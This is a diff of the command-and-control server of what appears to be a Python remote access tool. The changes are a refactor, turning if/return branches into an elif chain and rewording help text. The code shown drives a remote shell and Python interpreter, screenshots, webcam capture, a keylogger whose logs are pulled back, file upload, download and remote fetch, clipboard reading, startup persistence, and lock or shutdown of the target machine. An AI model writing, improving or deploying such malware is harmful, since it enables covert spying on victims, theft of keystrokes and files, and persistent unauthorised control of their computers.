@@ -29,8 +29,8 @@ logging.basicConfig(level=logging.CRITICAL)
 INTERFACE_HELP = """--h | See this Help Message
 --e | Open a shell
 --i | Open Remote Python Interpreter
---g | Grabs a screenshot
---w | Grab a webcam image
+--g | Grab a screenshot
+--w | Capture webcam
 --u | User Info
 --k (start) (stop) (status) | Manage Keylogger
 --l | Returns log from client (includes keylogs)
@@ -290,7 +290,7 @@ class Client(object):
         return True, save_as
 
     def webcam(self, save_as=None) -> (bool, str):
-        """ Take a webcam shot """
+        """ Capture webcam """
         # returns True/False, save_as/None
         if not save_as:
             save_as = f'webcam-{_time()}.png'
@@ -535,65 +535,53 @@ class MultiServer(object):
         select = commands[-1]
         if '--h' in command:
             print(INTERFACE_HELP)
-            return
-        if '--e' in command:
+        elif '--e' in command:
             try:
                 self.shell(client)
             except (EOFError, KeyboardInterrupt):
                 print()
-            return
-        if '--i' in command:
+        elif '--i' in command:
             try:
                 self.python_interpreter(client)
             except (EOFError, KeyboardInterrupt):
                 print()
-            return
-        if '--g' in command:
+        elif '--g' in command:
             print('Taking Screenshot...')
             result, error = client.screenshot()
             if result:
                 print('Saved Screenshot.')
             else:
                 print(f'Error Taking Screenshot: {error.decode()}')
-            return
-        if '--w' in command:
+        elif '--w' in command:
             print('Accessing webcam...')
-            result, save_as = client.webcam()
+            result, _ = client.webcam()
             if result:
                 print('Saved webcam image')
             else:
-                print('Error capturing Webcam image')
-            return
-        if '--u' in command:
+                print('Webcam Capture Error')
+        elif '--u' in command:
             client.info()
-            return
-        if command == '--k':
+        elif command == '--k':
             if select == 'start':
                 if client.start_keylogger():
                     print('Started Keylogger')
                 else:
                     print('Keylogger ImportError')
-                return
-            if select == 'status':
+            elif select == 'status':
                 if client.start_keylogger():
                     print('Keylogger Running')
                 else:
                     print('Keylogger is not running.')
-                return
-            if select == 'stop':
+            elif select == 'stop':
                 if client.stop_keylogger():
                     print('Stopped Keylogger')
                 else:
                     print('Keylogger ImportError')
-                return
-            print("Invalid Argument: '--h' for help")
-            return
-        if '--l' in command:
+        elif '--l' in command:
             print('Transferring log...')
             log = client.get_log()
             print(f'Log saved as: {log}')
-            return
-        if '--s' in command:
+        elif '--s' in command:
             file_to_transfer = input('File to Transfer to Client: ')
             save_as = input('Save as: ')
             print('Transferring file...')
@@ -602,8 +590,7 @@ class MultiServer(object):
                 print('File transferred.')
             else:
                 print(f'Error transferring file: {error}')
-            return
-        if '--r' in command:
+        elif '--r' in command:
             file_to_transfer = input('File to Transfer to Server: ')
             save_as = input('Save as: ')
             print('Transferring file...')
@@ -612,8 +599,7 @@ class MultiServer(object):
                 print('File transferred.')
             else:
                 print(f'Error transferring file: {error}')
-            return
-        if '--d' in command:
+        elif '--d' in command:
             file_url = input('File URL: ')
             file_name = input('Filename: ')
             print('Downloading File...')
@@ -622,8 +608,7 @@ class MultiServer(object):
                 print('Downloaded file successfully')
             else:
                 print(error)
-            return
-        if command == '--z':
+        elif command == '--z':
             if select == 'file':
                 save_as = input('Zip Filename: ')
                 file_to_zip = input('File to Zip: ')
@@ -632,8 +617,7 @@ class MultiServer(object):
                     print('Zipping Successful.')
                 else:
                     print(error)
-                return
-            if select == 'dir':
+            elif select == 'dir':
                 save_as = input('Zip Filename: ')
                 dir_to_zip = input('Directory to Zip: ')
                 result, error = client.zip_dir(save_as, dir_to_zip)
@@ -641,51 +625,42 @@ class MultiServer(object):
                     print('Zipped Directory Successfully.')
                 else:
                     print(error)
-                return
-            if select == 'unzip':
+            elif select == 'unzip':
                 zip_filename = input('Zip File: ')
                 result, error = client.unzip(zip_filename)
                 if result:
                     print('Unzipped Successfully.')
                 else:
                     print(error)
-                return
-        if '--c' in command:
+        elif '--c' in command:
             text_to_copy = input('Text to copy: ')
             result, error = client.fill_clipboard(text_to_copy)
             if result:
                 print('Copied to Clipboard.')
             else:
                 print(error)
-            return
-        if '--p' in command:
+        elif '--p' in command:
             _, output = client.clipboard()
             print(output)
-            return
-        if command == '--t':
+        elif command == '--t':
             if select == 'add':
                 result, error = client.add_startup()
                 if result:
                     print('Client added to Startup')
                 else:
                     print(error)
-                return
-            if select == 'remove':
+            elif select == 'remove':
                 result, error = client.remove_startup()
                 if result:
                     print('Removed Client from Startup')
                 else:
                     print(error)
-                return
-            print("Invalid Argument: '--h' for help")
-            return
-        if command == '--q':
+        elif command == '--q':
             if select == 'lock':
                 if client.lock():
                     print('Locked Client Machine')
                 else:
                     print('Locking is only available on Windows.')
-                return
             elif select == 'shutdown':
                 result = client.shutdown()
                 if result:
@@ -700,9 +675,7 @@ class MultiServer(object):
                 else:
                     print('Restart is only available on Windows.')
                 return result
-            print("Invalid Argument: '--h' for help")
-            return
-        if command == '--x':
+        elif command == '--x':
             if select == 'restart':
                 print('Restarting Session...')
                 client.restart_session()
@@ -713,11 +686,10 @@ class MultiServer(object):
                 client.disconnect()
                 self.refresh_connections()
                 return True
-            print("Invalid Argument: '--h' for help")
-            return
-        if '--b' in command:
+        elif '--b' in command:
             return True
-        print("Invalid command: '--h' for help.")
+        else:
+            print("Invalid command: '--h' for help.")
 
     def broadcast(self, command) -> None:
         """ Broadcast a command to all connected Clients """
@@ -731,7 +703,7 @@ class MultiServer(object):
                 print(errors(e))
 
     def interface(self, client) -> None:
-        """ CLI Interface to Client """
+        """ CLI to Client """
         # returns None
         ip = client.address[0]
         while True:
